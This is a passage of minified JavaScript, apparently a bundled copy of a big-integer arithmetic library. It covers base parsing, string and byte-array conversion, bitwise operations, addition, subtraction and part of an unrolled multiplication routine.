            function F(ce, q, L, U) {
                for (var Z = 0, te = Math.min(ce.length, L), se = q; se < te; se++) {
                    var de = ce.charCodeAt(se) - 48;
                    Z *= U,
                    de >= 49 ? Z += de - 49 + 10 : de >= 17 ? Z += de - 17 + 10 : Z += de
                }
                return Z
            }
            w.prototype._parseBase = function(q, L, U) {
                this.words = [0],
                this.length = 1;
                for (var Z = 0, te = 1; te <= 67108863; te *= L)
                    Z++;
                Z--,
                te = te / L | 0;
                for (var se = q.length - U, de = se % Z, re = Math.min(se, se - de) + U, $ = 0, ie = U; ie < re; ie += Z)
                    $ = F(q, ie, ie + Z, L),
                    this.imuln(te),
                    this.words[0] + $ < 67108864 ? this.words[0] += $ : this._iaddn($);
                if (de !== 0) {
                    var ve = 1;
                    for ($ = F(q, ie, q.length, L),
                    ie = 0; ie < de; ie++)
                        ve *= L;
                    this.imuln(ve),
                    this.words[0] + $ < 67108864 ? this.words[0] += $ : this._iaddn($)
                }
                this.strip()
            }
            ,
            w.prototype.copy = function(q) {
                q.words = new Array(this.length);
                for (var L = 0; L < this.length; L++)
                    q.words[L] = this.words[L];
                q.length = this.length,
                q.negative = this.negative,
                q.red = this.red
            }
            ,
            w.prototype.clone = function() {
                var q = new w(null);
                return this.copy(q),
                q
            }
            ,
            w.prototype._expand = function(q) {
                for (; this.length < q; )
                    this.words[this.length++] = 0;
                return this
            }
            ,
            w.prototype.strip = function() {
                for (; this.length > 1 && this.words[this.length - 1] === 0; )
                    this.length--;
                return this._normSign()
            }
            ,
            w.prototype._normSign = function() {
                return this.length === 1 && this.words[0] === 0 && (this.negative = 0),
                this
            }
            ,
            w.prototype.inspect = function() {
                return (this.red ? "<BN-R: " : "<BN: ") + this.toString(16) + ">"
            }
            ;
            var V = ["", "0", "00", "000", "0000", "00000", "000000", "0000000", "00000000", "000000000", "0000000000", "00000000000", "000000000000", "0000000000000", "00000000000000", "000000000000000", "0000000000000000", "00000000000000000", "000000000000000000", "0000000000000000000", "00000000000000000000", "000000000000000000000", "0000000000000000000000", "00000000000000000000000", "000000000000000000000000", "0000000000000000000000000"]
              , K = [0, 0, 25, 16, 12, 11, 10, 9, 8, 8, 7, 7, 7, 7, 6, 6, 6, 6, 6, 6, 6, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5]
              , Q = [0, 0, 33554432, 43046721, 16777216, 48828125, 60466176, 40353607, 16777216, 43046721, 1e7, 19487171, 35831808, 62748517, 7529536, 11390625, 16777216, 24137569, 34012224, 47045881, 64e6, 4084101, 5153632, 6436343, 7962624, 9765625, 11881376, 14348907, 17210368, 20511149, 243e5, 28629151, 33554432, 39135393, 45435424, 52521875, 60466176];
            w.prototype.toString = function(q, L) {
                q = q || 10,
                L = L | 0 || 1;
                var U;
                if (q === 16 || q === "hex") {
                    U = "";
                    for (var Z = 0, te = 0, se = 0; se < this.length; se++) {
                        var de = this.words[se]
                          , re = ((de << Z | te) & 16777215).toString(16);
                        te = de >>> 24 - Z & 16777215,
                        Z += 2,
                        Z >= 26 && (Z -= 26,
                        se--),
                        te !== 0 || se !== this.length - 1 ? U = V[6 - re.length] + re + U : U = re + U
                    }
                    for (te !== 0 && (U = te.toString(16) + U); U.length % L !== 0; )
                        U = "0" + U;
                    return this.negative !== 0 && (U = "-" + U),
                    U
                }
                if (q === (q | 0) && q >= 2 && q <= 36) {
                    var $ = K[q]
                      , ie = Q[q];
                    U = "";
                    var ve = this.clone();
                    for (ve.negative = 0; !ve.isZero(); ) {
                        var ge = ve.modn(ie).toString(q);
                        ve = ve.idivn(ie),
                        ve.isZero() ? U = ge + U : U = V[$ - ge.length] + ge + U
                    }
                    for (this.isZero() && (U = "0" + U); U.length % L !== 0; )
                        U = "0" + U;
                    return this.negative !== 0 && (U = "-" + U),
                    U
                }
                O(!1, "Base should be between 2 and 36")
            }
            ,
            w.prototype.toNumber = function() {
                var q = this.words[0];
                return this.length === 2 ? q += this.words[1] * 67108864 : this.length === 3 && this.words[2] === 1 ? q += 4503599627370496 + this.words[1] * 67108864 : this.length > 2 && O(!1, "Number can only safely store up to 53 bits"),
                this.negative !== 0 ? -q : q
            }
            ,
            w.prototype.toJSON = function() {
                return this.toString(16)
            }
            ,
            w.prototype.toBuffer = function(q, L) {
                return O(typeof b < "u"),
                this.toArrayLike(b, q, L)
            }
            ,
            w.prototype.toArray = function(q, L) {
                return this.toArrayLike(Array, q, L)
            }
            ,
            w.prototype.toArrayLike = function(q, L, U) {
                var Z = this.byteLength()
                  , te = U || Math.max(1, Z);
                O(Z <= te, "byte array longer than desired length"),
                O(te > 0, "Requested array length <= 0"),
                this.strip();
                var se = L === "le", de = new q(te), re, $, ie = this.clone();
                if (se) {
                    for ($ = 0; !ie.isZero(); $++)
                        re = ie.andln(255),
                        ie.iushrn(8),
                        de[$] = re;
                    for (; $ < te; $++)
                        de[$] = 0
                } else {
                    for ($ = 0; $ < te - Z; $++)
                        de[$] = 0;
                    for ($ = 0; !ie.isZero(); $++)
                        re = ie.andln(255),
                        ie.iushrn(8),
                        de[te - $ - 1] = re
                }
                return de
            }
            ,
            Math.clz32 ? w.prototype._countBits = function(q) {
                return 32 - Math.clz32(q)
            }
            : w.prototype._countBits = function(q) {
                var L = q
                  , U = 0;
                return L >= 4096 && (U += 13,
                L >>>= 13),
                L >= 64 && (U += 7,
                L >>>= 7),
                L >= 8 && (U += 4,
                L >>>= 4),
                L >= 2 && (U += 2,
                L >>>= 2),
                U + L
            }
            ,
            w.prototype._zeroBits = function(q) {
                if (q === 0)
                    return 26;
                var L = q
                  , U = 0;
                return (L & 8191) === 0 && (U += 13,
                L >>>= 13),
                (L & 127) === 0 && (U += 7,
                L >>>= 7),
                (L & 15) === 0 && (U += 4,
                L >>>= 4),
                (L & 3) === 0 && (U += 2,
                L >>>= 2),
                (L & 1) === 0 && U++,
                U
            }
            ,
            w.prototype.bitLength = function() {
                var q = this.words[this.length - 1]
                  , L = this._countBits(q);
                return (this.length - 1) * 26 + L
            }
            ;
            function ee(ce) {
                for (var q = new Array(ce.bitLength()), L = 0; L < q.length; L++) {
                    var U = L / 26 | 0
                      , Z = L % 26;
                    q[L] = (ce.words[U] & 1 << Z) >>> Z
                }
                return q
            }
            w.prototype.zeroBits = function() {
                if (this.isZero())
                    return 0;
                for (var q = 0, L = 0; L < this.length; L++) {
                    var U = this._zeroBits(this.words[L]);
                    if (q += U,
                    U !== 26)
                        break
                }
                return q
            }
            ,
            w.prototype.byteLength = function() {
                return Math.ceil(this.bitLength() / 8)
            }
            ,
            w.prototype.toTwos = function(q) {
                return this.negative !== 0 ? this.abs().inotn(q).iaddn(1) : this.clone()
            }
            ,
            w.prototype.fromTwos = function(q) {
                return this.testn(q - 1) ? this.notn(q).iaddn(1).ineg() : this.clone()
            }
            ,
            w.prototype.isNeg = function() {
                return this.negative !== 0
            }
            ,
            w.prototype.neg = function() {
                return this.clone().ineg()
            }
            ,
            w.prototype.ineg = function() {
                return this.isZero() || (this.negative ^= 1),
                this
            }
            ,
            w.prototype.iuor = function(q) {
                for (; this.length < q.length; )
                    this.words[this.length++] = 0;
                for (var L = 0; L < q.length; L++)
                    this.words[L] = this.words[L] | q.words[L];
                return this.strip()
            }
            ,
            w.prototype.ior = function(q) {
                return O((this.negative | q.negative) === 0),
                this.iuor(q)
            }
            ,
            w.prototype.or = function(q) {
                return this.length > q.length ? this.clone().ior(q) : q.clone().ior(this)
            }
            ,
            w.prototype.uor = function(q) {
                return this.length > q.length ? this.clone().iuor(q) : q.clone().iuor(this)
            }
            ,
            w.prototype.iuand = function(q) {
                var L;
                this.length > q.length ? L = q : L = this;
                for (var U = 0; U < L.length; U++)
                    this.words[U] = this.words[U] & q.words[U];
                return this.length = L.length,
                this.strip()
            }
            ,
            w.prototype.iand = function(q) {
                return O((this.negative | q.negative) === 0),
                this.iuand(q)
            }
            ,
            w.prototype.and = function(q) {
                return this.length > q.length ? this.clone().iand(q) : q.clone().iand(this)
            }
            ,
            w.prototype.uand = function(q) {
                return this.length > q.length ? this.clone().iuand(q) : q.clone().iuand(this)
            }
            ,
            w.prototype.iuxor = function(q) {
                var L, U;
                this.length > q.length ? (L = this,
                U = q) : (L = q,
                U = this);
                for (var Z = 0; Z < U.length; Z++)
                    this.words[Z] = L.words[Z] ^ U.words[Z];
                if (this !== L)
                    for (; Z < L.length; Z++)
                        this.words[Z] = L.words[Z];
                return this.length = L.length,
                this.strip()
            }
            ,
            w.prototype.ixor = function(q) {
                return O((this.negative | q.negative) === 0),
                this.iuxor(q)
            }
            ,
            w.prototype.xor = function(q) {
                return this.length > q.length ? this.clone().ixor(q) : q.clone().ixor(this)
            }
            ,
            w.prototype.uxor = function(q) {
                return this.length > q.length ? this.clone().iuxor(q) : q.clone().iuxor(this)
            }
            ,
            w.prototype.inotn = function(q) {
                O(typeof q == "number" && q >= 0);
                var L = Math.ceil(q / 26) | 0
                  , U = q % 26;
                this._expand(L),
                U > 0 && L--;
                for (var Z = 0; Z < L; Z++)
                    this.words[Z] = ~this.words[Z] & 67108863;
                return U > 0 && (this.words[Z] = ~this.words[Z] & 67108863 >> 26 - U),
                this.strip()
            }
            ,
            w.prototype.notn = function(q) {
                return this.clone().inotn(q)
            }
            ,
            w.prototype.setn = function(q, L) {
                O(typeof q == "number" && q >= 0);
                var U = q / 26 | 0
                  , Z = q % 26;
                return this._expand(U + 1),
                L ? this.words[U] = this.words[U] | 1 << Z : this.words[U] = this.words[U] & ~(1 << Z),
                this.strip()
            }
            ,
            w.prototype.iadd = function(q) {
                var L;
                if (this.negative !== 0 && q.negative === 0)
                    return this.negative = 0,
                    L = this.isub(q),
                    this.negative ^= 1,
                    this._normSign();
                if (this.negative === 0 && q.negative !== 0)
                    return q.negative = 0,
                    L = this.isub(q),
                    q.negative = 1,
                    L._normSign();
                var U, Z;
                this.length > q.length ? (U = this,
                Z = q) : (U = q,
                Z = this);
                for (var te = 0, se = 0; se < Z.length; se++)
                    L = (U.words[se] | 0) + (Z.words[se] | 0) + te,
                    this.words[se] = L & 67108863,
                    te = L >>> 26;
                for (; te !== 0 && se < U.length; se++)
                    L = (U.words[se] | 0) + te,
                    this.words[se] = L & 67108863,
                    te = L >>> 26;
                if (this.length = U.length,
                te !== 0)
                    this.words[this.length] = te,
                    this.length++;
                else if (U !== this)
                    for (; se < U.length; se++)
                        this.words[se] = U.words[se];
                return this
            }
            ,
            w.prototype.add = function(q) {
                var L;
                return q.negative !== 0 && this.negative === 0 ? (q.negative = 0,
                L = this.sub(q),
                q.negative ^= 1,
                L) : q.negative === 0 && this.negative !== 0 ? (this.negative = 0,
                L = q.sub(this),
                this.negative = 1,
                L) : this.length > q.length ? this.clone().iadd(q) : q.clone().iadd(this)
            }
            ,
            w.prototype.isub = function(q) {
                if (q.negative !== 0) {
                    q.negative = 0;
                    var L = this.iadd(q);
                    return q.negative = 1,
                    L._normSign()
                } else if (this.negative !== 0)
                    return this.negative = 0,
                    this.iadd(q),
                    this.negative = 1,
                    this._normSign();
                var U = this.cmp(q);
                if (U === 0)
                    return this.negative = 0,
                    this.length = 1,
                    this.words[0] = 0,
                    this;
                var Z, te;
                U > 0 ? (Z = this,
                te = q) : (Z = q,
                te = this);
                for (var se = 0, de = 0; de < te.length; de++)
                    L = (Z.words[de] | 0) - (te.words[de] | 0) + se,
                    se = L >> 26,
                    this.words[de] = L & 67108863;
                for (; se !== 0 && de < Z.length; de++)
                    L = (Z.words[de] | 0) + se,
                    se = L >> 26,
                    this.words[de] = L & 67108863;
                if (se === 0 && de < Z.length && Z !== this)
                    for (; de < Z.length; de++)
                        this.words[de] = Z.words[de];
                return this.length = Math.max(this.length, de),
                Z !== this && (this.negative = 1),
                this.strip()
            }
            ,
            w.prototype.sub = function(q) {
                return this.clone().isub(q)
            }
            ;
            function ae(ce, q, L) {
                L.negative = q.negative ^ ce.negative;
                var U = ce.length + q.length | 0;
                L.length = U,
                U = U - 1 | 0;
                var Z = ce.words[0] | 0
                  , te = q.words[0] | 0
                  , se = Z * te
                  , de = se & 67108863
                  , re = se / 67108864 | 0;
                L.words[0] = de;
                for (var $ = 1; $ < U; $++) {
                    for (var ie = re >>> 26, ve = re & 67108863, ge = Math.min($, q.length - 1), Re = Math.max(0, $ - ce.length + 1); Re <= ge; Re++) {
                        var Pe = $ - Re | 0;
                        Z = ce.words[Pe] | 0,
                        te = q.words[Re] | 0,
                        se = Z * te + ve,
                        ie += se / 67108864 | 0,
                        ve = se & 67108863
                    }
                    L.words[$] = ve | 0,
                    re = ie | 0
                }
                return re !== 0 ? L.words[$] = re | 0 : L.length--,
                L.strip()
            }
            var ne = function(q, L, U) {
                var Z = q.words, te = L.words, se = U.words, de = 0, re, $, ie, ve = Z[0] | 0, ge = ve & 8191, Re = ve >>> 13, Pe = Z[1] | 0, Ie = Pe & 8191, Te = Pe >>> 13, Le = Z[2] | 0, Ze = Le & 8191, $e = Le >>> 13, Ne = Z[3] | 0, qe = Ne & 8191, Ve = Ne >>> 13, lt = Z[4] | 0, nt = lt & 8191, je = lt >>> 13, Ke = Z[5] | 0, Qe = Ke & 8191, We = Ke >>> 13, mt = Z[6] | 0, ct = mt & 8191, vt = mt >>> 13, we = Z[7] | 0, _e = we & 8191, Ce = we >>> 13, st = Z[8] | 0, et = st & 8191, tt = st >>> 13, He = Z[9] | 0, ke = He & 8191, Me = He >>> 13, Ue = te[0] | 0, rt = Ue & 8191, dt = Ue >>> 13, Et = te[1] | 0, ft = Et & 8191, gt = Et >>> 13, Yt = te[2] | 0, Ct = Yt & 8191, Ot = Yt >>> 13, Vt = te[3] | 0, Pt = Vt & 8191, Bt = Vt >>> 13, xr = te[4] | 0, Dt = xr & 8191, Ft = xr >>> 13, Mr = te[5] | 0, at = Mr & 8191, ze = Mr >>> 13, Je = te[6] | 0, ht = Je & 8191, _t = Je >>> 13, Ge = te[7] | 0, Ye = Ge & 8191, it = Ge >>> 13, Fe = te[8] | 0, ut = Fe & 8191, wt = Fe >>> 13, At = te[9] | 0, St = At & 8191, Tt = At >>> 13;
                U.negative = q.negative ^ L.negative,
                U.length = 19,
                re = Math.imul(ge, rt),
                $ = Math.imul(ge, dt),
                $ = $ + Math.imul(Re, rt) | 0,
                ie = Math.imul(Re, dt);
                var er = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (er >>> 26) | 0,
                er &= 67108863,
                re = Math.imul(Ie, rt),
                $ = Math.imul(Ie, dt),
                $ = $ + Math.imul(Te, rt) | 0,
                ie = Math.imul(Te, dt),
                re = re + Math.imul(ge, ft) | 0,
                $ = $ + Math.imul(ge, gt) | 0,
                $ = $ + Math.imul(Re, ft) | 0,
                ie = ie + Math.imul(Re, gt) | 0;
                var Xt = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (Xt >>> 26) | 0,
                Xt &= 67108863,
                re = Math.imul(Ze, rt),
                $ = Math.imul(Ze, dt),
                $ = $ + Math.imul($e, rt) | 0,
                ie = Math.imul($e, dt),
                re = re + Math.imul(Ie, ft) | 0,
                $ = $ + Math.imul(Ie, gt) | 0,
                $ = $ + Math.imul(Te, ft) | 0,
                ie = ie + Math.imul(Te, gt) | 0,
                re = re + Math.imul(ge, Ct) | 0,
                $ = $ + Math.imul(ge, Ot) | 0,
                $ = $ + Math.imul(Re, Ct) | 0,
                ie = ie + Math.imul(Re, Ot) | 0;
                var pr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (pr >>> 26) | 0,
                pr &= 67108863,
                re = Math.imul(qe, rt),
                $ = Math.imul(qe, dt),
                $ = $ + Math.imul(Ve, rt) | 0,
                ie = Math.imul(Ve, dt),
                re = re + Math.imul(Ze, ft) | 0,
                $ = $ + Math.imul(Ze, gt) | 0,
                $ = $ + Math.imul($e, ft) | 0,
                ie = ie + Math.imul($e, gt) | 0,
                re = re + Math.imul(Ie, Ct) | 0,
                $ = $ + Math.imul(Ie, Ot) | 0,
                $ = $ + Math.imul(Te, Ct) | 0,
                ie = ie + Math.imul(Te, Ot) | 0,
                re = re + Math.imul(ge, Pt) | 0,
                $ = $ + Math.imul(ge, Bt) | 0,
                $ = $ + Math.imul(Re, Pt) | 0,
                ie = ie + Math.imul(Re, Bt) | 0;
                var or = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (or >>> 26) | 0,
                or &= 67108863,
                re = Math.imul(nt, rt),
                $ = Math.imul(nt, dt),
                $ = $ + Math.imul(je, rt) | 0,
                ie = Math.imul(je, dt),
                re = re + Math.imul(qe, ft) | 0,
                $ = $ + Math.imul(qe, gt) | 0,
                $ = $ + Math.imul(Ve, ft) | 0,
                ie = ie + Math.imul(Ve, gt) | 0,
                re = re + Math.imul(Ze, Ct) | 0,
                $ = $ + Math.imul(Ze, Ot) | 0,
                $ = $ + Math.imul($e, Ct) | 0,
                ie = ie + Math.imul($e, Ot) | 0,
                re = re + Math.imul(Ie, Pt) | 0,
                $ = $ + Math.imul(Ie, Bt) | 0,
                $ = $ + Math.imul(Te, Pt) | 0,
                ie = ie + Math.imul(Te, Bt) | 0,
                re = re + Math.imul(ge, Dt) | 0,
                $ = $ + Math.imul(ge, Ft) | 0,
                $ = $ + Math.imul(Re, Dt) | 0,
                ie = ie + Math.imul(Re, Ft) | 0;
                var yr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (yr >>> 26) | 0,
                yr &= 67108863,
                re = Math.imul(Qe, rt),
                $ = Math.imul(Qe, dt),
                $ = $ + Math.imul(We, rt) | 0,
                ie = Math.imul(We, dt),
                re = re + Math.imul(nt, ft) | 0,
                $ = $ + Math.imul(nt, gt) | 0,
                $ = $ + Math.imul(je, ft) | 0,
                ie = ie + Math.imul(je, gt) | 0,
                re = re + Math.imul(qe, Ct) | 0,
                $ = $ + Math.imul(qe, Ot) | 0,
                $ = $ + Math.imul(Ve, Ct) | 0,
                ie = ie + Math.imul(Ve, Ot) | 0,
                re = re + Math.imul(Ze, Pt) | 0,
                $ = $ + Math.imul(Ze, Bt) | 0,
                $ = $ + Math.imul($e, Pt) | 0,
                ie = ie + Math.imul($e, Bt) | 0,
                re = re + Math.imul(Ie, Dt) | 0,
                $ = $ + Math.imul(Ie, Ft) | 0,
                $ = $ + Math.imul(Te, Dt) | 0,
                ie = ie + Math.imul(Te, Ft) | 0,
                re = re + Math.imul(ge, at) | 0,
                $ = $ + Math.imul(ge, ze) | 0,
                $ = $ + Math.imul(Re, at) | 0,
                ie = ie + Math.imul(Re, ze) | 0;
                var vr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (vr >>> 26) | 0,
                vr &= 67108863,
                re = Math.imul(ct, rt),
                $ = Math.imul(ct, dt),
                $ = $ + Math.imul(vt, rt) | 0,
                ie = Math.imul(vt, dt),
                re = re + Math.imul(Qe, ft) | 0,
                $ = $ + Math.imul(Qe, gt) | 0,
                $ = $ + Math.imul(We, ft) | 0,
                ie = ie + Math.imul(We, gt) | 0,
                re = re + Math.imul(nt, Ct) | 0,
                $ = $ + Math.imul(nt, Ot) | 0,
                $ = $ + Math.imul(je, Ct) | 0,
                ie = ie + Math.imul(je, Ot) | 0,
                re = re + Math.imul(qe, Pt) | 0,
                $ = $ + Math.imul(qe, Bt) | 0,
                $ = $ + Math.imul(Ve, Pt) | 0,
                ie = ie + Math.imul(Ve, Bt) | 0,
                re = re + Math.imul(Ze, Dt) | 0,
                $ = $ + Math.imul(Ze, Ft) | 0,
                $ = $ + Math.imul($e, Dt) | 0,
                ie = ie + Math.imul($e, Ft) | 0,
                re = re + Math.imul(Ie, at) | 0,
                $ = $ + Math.imul(Ie, ze) | 0,
                $ = $ + Math.imul(Te, at) | 0,
                ie = ie + Math.imul(Te, ze) | 0,
                re = re + Math.imul(ge, ht) | 0,
                $ = $ + Math.imul(ge, _t) | 0,
                $ = $ + Math.imul(Re, ht) | 0,
                ie = ie + Math.imul(Re, _t) | 0;
                var gr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (gr >>> 26) | 0,
                gr &= 67108863,
                re = Math.imul(_e, rt),
                $ = Math.imul(_e, dt),
                $ = $ + Math.imul(Ce, rt) | 0,
                ie = Math.imul(Ce, dt),
                re = re + Math.imul(ct, ft) | 0,
                $ = $ + Math.imul(ct, gt) | 0,
                $ = $ + Math.imul(vt, ft) | 0,
                ie = ie + Math.imul(vt, gt) | 0,
                re = re + Math.imul(Qe, Ct) | 0,
                $ = $ + Math.imul(Qe, Ot) | 0,
                $ = $ + Math.imul(We, Ct) | 0,
                ie = ie + Math.imul(We, Ot) | 0,
                re = re + Math.imul(nt, Pt) | 0,
                $ = $ + Math.imul(nt, Bt) | 0,
                $ = $ + Math.imul(je, Pt) | 0,
                ie = ie + Math.imul(je, Bt) | 0,
                re = re + Math.imul(qe, Dt) | 0,
                $ = $ + Math.imul(qe, Ft) | 0,
                $ = $ + Math.imul(Ve, Dt) | 0,
                ie = ie + Math.imul(Ve, Ft) | 0,
                re = re + Math.imul(Ze, at) | 0,
                $ = $ + Math.imul(Ze, ze) | 0,
                $ = $ + Math.imul($e, at) | 0,
                ie = ie + Math.imul($e, ze) | 0,
                re = re + Math.imul(Ie, ht) | 0,
                $ = $ + Math.imul(Ie, _t) | 0,
                $ = $ + Math.imul(Te, ht) | 0,
                ie = ie + Math.imul(Te, _t) | 0,
                re = re + Math.imul(ge, Ye) | 0,
                $ = $ + Math.imul(ge, it) | 0,
                $ = $ + Math.imul(Re, Ye) | 0,
                ie = ie + Math.imul(Re, it) | 0;
                var Sr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (Sr >>> 26) | 0,
                Sr &= 67108863,
                re = Math.imul(et, rt),
                $ = Math.imul(et, dt),
                $ = $ + Math.imul(tt, rt) | 0,
                ie = Math.imul(tt, dt),
                re = re + Math.imul(_e, ft) | 0,
                $ = $ + Math.imul(_e, gt) | 0,
                $ = $ + Math.imul(Ce, ft) | 0,
                ie = ie + Math.imul(Ce, gt) | 0,
                re = re + Math.imul(ct, Ct) | 0,
                $ = $ + Math.imul(ct, Ot) | 0,
                $ = $ + Math.imul(vt, Ct) | 0,
                ie = ie + Math.imul(vt, Ot) | 0,
                re = re + Math.imul(Qe, Pt) | 0,
                $ = $ + Math.imul(Qe, Bt) | 0,
                $ = $ + Math.imul(We, Pt) | 0,
                ie = ie + Math.imul(We, Bt) | 0,
                re = re + Math.imul(nt, Dt) | 0,
                $ = $ + Math.imul(nt, Ft) | 0,
                $ = $ + Math.imul(je, Dt) | 0,
                ie = ie + Math.imul(je, Ft) | 0,
                re = re + Math.imul(qe, at) | 0,
                $ = $ + Math.imul(qe, ze) | 0,
                $ = $ + Math.imul(Ve, at) | 0,
                ie = ie + Math.imul(Ve, ze) | 0,
                re = re + Math.imul(Ze, ht) | 0,
                $ = $ + Math.imul(Ze, _t) | 0,
                $ = $ + Math.imul($e, ht) | 0,
                ie = ie + Math.imul($e, _t) | 0,
                re = re + Math.imul(Ie, Ye) | 0,
                $ = $ + Math.imul(Ie, it) | 0,
                $ = $ + Math.imul(Te, Ye) | 0,
                ie = ie + Math.imul(Te, it) | 0,
                re = re + Math.imul(ge, ut) | 0,
                $ = $ + Math.imul(ge, wt) | 0,
                $ = $ + Math.imul(Re, ut) | 0,
                ie = ie + Math.imul(Re, wt) | 0;
                var br = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (br >>> 26) | 0,
                br &= 67108863,
                re = Math.imul(ke, rt),
                $ = Math.imul(ke, dt),
                $ = $ + Math.imul(Me, rt) | 0,
                ie = Math.imul(Me, dt),
                re = re + Math.imul(et, ft) | 0,
                $ = $ + Math.imul(et, gt) | 0,
                $ = $ + Math.imul(tt, ft) | 0,
                ie = ie + Math.imul(tt, gt) | 0,
                re = re + Math.imul(_e, Ct) | 0,
                $ = $ + Math.imul(_e, Ot) | 0,
                $ = $ + Math.imul(Ce, Ct) | 0,
                ie = ie + Math.imul(Ce, Ot) | 0,
                re = re + Math.imul(ct, Pt) | 0,
                $ = $ + Math.imul(ct, Bt) | 0,
                $ = $ + Math.imul(vt, Pt) | 0,
                ie = ie + Math.imul(vt, Bt) | 0,
                re = re + Math.imul(Qe, Dt) | 0,
                $ = $ + Math.imul(Qe, Ft) | 0,
                $ = $ + Math.imul(We, Dt) | 0,
                ie = ie + Math.imul(We, Ft) | 0,
                re = re + Math.imul(nt, at) | 0,
                $ = $ + Math.imul(nt, ze) | 0,
                $ = $ + Math.imul(je, at) | 0,
                ie = ie + Math.imul(je, ze) | 0,
                re = re + Math.imul(qe, ht) | 0,
                $ = $ + Math.imul(qe, _t) | 0,
                $ = $ + Math.imul(Ve, ht) | 0,
                ie = ie + Math.imul(Ve, _t) | 0,
                re = re + Math.imul(Ze, Ye) | 0,
                $ = $ + Math.imul(Ze, it) | 0,
                $ = $ + Math.imul($e, Ye) | 0,
                ie = ie + Math.imul($e, it) | 0,
                re = re + Math.imul(Ie, ut) | 0,
                $ = $ + Math.imul(Ie, wt) | 0,
                $ = $ + Math.imul(Te, ut) | 0,
                ie = ie + Math.imul(Te, wt) | 0,
                re = re + Math.imul(ge, St) | 0,
                $ = $ + Math.imul(ge, Tt) | 0,
                $ = $ + Math.imul(Re, St) | 0,
                ie = ie + Math.imul(Re, Tt) | 0;
                var _r = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (_r >>> 26) | 0,
                _r &= 67108863,
                re = Math.imul(ke, ft),
                $ = Math.imul(ke, gt),
                $ = $ + Math.imul(Me, ft) | 0,
                ie = Math.imul(Me, gt),
                re = re + Math.imul(et, Ct) | 0,
                $ = $ + Math.imul(et, Ot) | 0,
                $ = $ + Math.imul(tt, Ct) | 0,
                ie = ie + Math.imul(tt, Ot) | 0,
                re = re + Math.imul(_e, Pt) | 0,
                $ = $ + Math.imul(_e, Bt) | 0,
                $ = $ + Math.imul(Ce, Pt) | 0,
                ie = ie + Math.imul(Ce, Bt) | 0,
                re = re + Math.imul(ct, Dt) | 0,
                $ = $ + Math.imul(ct, Ft) | 0,
                $ = $ + Math.imul(vt, Dt) | 0,
                ie = ie + Math.imul(vt, Ft) | 0,
                re = re + Math.imul(Qe, at) | 0,
                $ = $ + Math.imul(Qe, ze) | 0,
                $ = $ + Math.imul(We, at) | 0,
                ie = ie + Math.imul(We, ze) | 0,
                re = re + Math.imul(nt, ht) | 0,
                $ = $ + Math.imul(nt, _t) | 0,
                $ = $ + Math.imul(je, ht) | 0,
                ie = ie + Math.imul(je, _t) | 0,
                re = re + Math.imul(qe, Ye) | 0,
                $ = $ + Math.imul(qe, it) | 0,
                $ = $ + Math.imul(Ve, Ye) | 0,
                ie = ie + Math.imul(Ve, it) | 0,
                re = re + Math.imul(Ze, ut) | 0,
                $ = $ + Math.imul(Ze, wt) | 0,
                $ = $ + Math.imul($e, ut) | 0,
                ie = ie + Math.imul($e, wt) | 0,
                re = re + Math.imul(Ie, St) | 0,
                $ = $ + Math.imul(Ie, Tt) | 0,
                $ = $ + Math.imul(Te, St) | 0,
                ie = ie + Math.imul(Te, Tt) | 0;
                var wr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (wr >>> 26) | 0,
                wr &= 67108863,
                re = Math.imul(ke, Ct),
                $ = Math.imul(ke, Ot),
                $ = $ + Math.imul(Me, Ct) | 0,
                ie = Math.imul(Me, Ot),
                re = re + Math.imul(et, Pt) | 0,
                $ = $ + Math.imul(et, Bt) | 0,
                $ = $ + Math.imul(tt, Pt) | 0,
                ie = ie + Math.imul(tt, Bt) | 0,
                re = re + Math.imul(_e, Dt) | 0,
                $ = $ + Math.imul(_e, Ft) | 0,
                $ = $ + Math.imul(Ce, Dt) | 0,
                ie = ie + Math.imul(Ce, Ft) | 0,
                re = re + Math.imul(ct, at) | 0,
                $ = $ + Math.imul(ct, ze) | 0,
                $ = $ + Math.imul(vt, at) | 0,
                ie = ie + Math.imul(vt, ze) | 0,
                re = re + Math.imul(Qe, ht) | 0,
                $ = $ + Math.imul(Qe, _t) | 0,
                $ = $ + Math.imul(We, ht) | 0,
                ie = ie + Math.imul(We, _t) | 0,
                re = re + Math.imul(nt, Ye) | 0,
                $ = $ + Math.imul(nt, it) | 0,
                $ = $ + Math.imul(je, Ye) | 0,
                ie = ie + Math.imul(je, it) | 0,
                re = re + Math.imul(qe, ut) | 0,
                $ = $ + Math.imul(qe, wt) | 0,
                $ = $ + Math.imul(Ve, ut) | 0,
                ie = ie + Math.imul(Ve, wt) | 0,
                re = re + Math.imul(Ze, St) | 0,
                $ = $ + Math.imul(Ze, Tt) | 0,
                $ = $ + Math.imul($e, St) | 0,
                ie = ie + Math.imul($e, Tt) | 0;
                var sr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (sr >>> 26) | 0,
                sr &= 67108863,
                re = Math.imul(ke, Pt),
                $ = Math.imul(ke, Bt),
                $ = $ + Math.imul(Me, Pt) | 0,
                ie = Math.imul(Me, Bt),
                re = re + Math.imul(et, Dt) | 0,
                $ = $ + Math.imul(et, Ft) | 0,
                $ = $ + Math.imul(tt, Dt) | 0,
                ie = ie + Math.imul(tt, Ft) | 0,
                re = re + Math.imul(_e, at) | 0,
                $ = $ + Math.imul(_e, ze) | 0,
                $ = $ + Math.imul(Ce, at) | 0,
                ie = ie + Math.imul(Ce, ze) | 0,
                re = re + Math.imul(ct, ht) | 0,
